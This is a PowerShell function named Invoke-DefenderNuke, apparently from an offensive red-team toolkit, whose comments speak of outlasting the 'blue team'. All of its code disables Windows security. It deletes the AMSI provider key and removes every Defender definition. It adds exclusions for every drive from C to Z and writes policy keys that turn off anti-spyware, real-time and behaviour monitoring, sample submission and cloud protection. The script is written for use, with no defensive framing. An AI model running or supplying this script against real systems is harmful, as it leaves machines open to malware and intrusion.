function Invoke-DefenderNuke {

    # Some inspiration from https://github.com/jeremybeaume/tools/blob/master/disable-defender.ps1

    # Permanently remove AMSI
    # TODO: Test this, seems too good to be true
    Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse

    # Remove all definitons
    # Credit for idea: https://twitter.com/Alh4zr3d/status/1568232424386985985
    & "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

    # Exclude all drives in case blue team resolves other issues
    67..90 | Foreach-Object{
        $drive = [char]$_
        Add-MpPreference -ExclusionPath "$($drive):\" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "$($drive):\*" -ErrorAction SilentlyContinue
    }
    
    # TODO: Break service permissions


    New-Item -path "HKLM:\SOFTWARE\Policies\Microsoft" -name "Windows Defender" -Force | Out-Null
    New-Item -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -name "Real-Time Protection" -Force | Out-Null

    # Disable Core Defender Capability
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force 

    # Disable Real-Time Monitoring
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force

    # Disable Behavior Monitoring
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Force

    # Disable Automatic Sample Submission
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 2 -Force

    # Disable Cloud Based Protection
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Spynet" -Name "SpynetReporting" -Value 0 -Force
    

}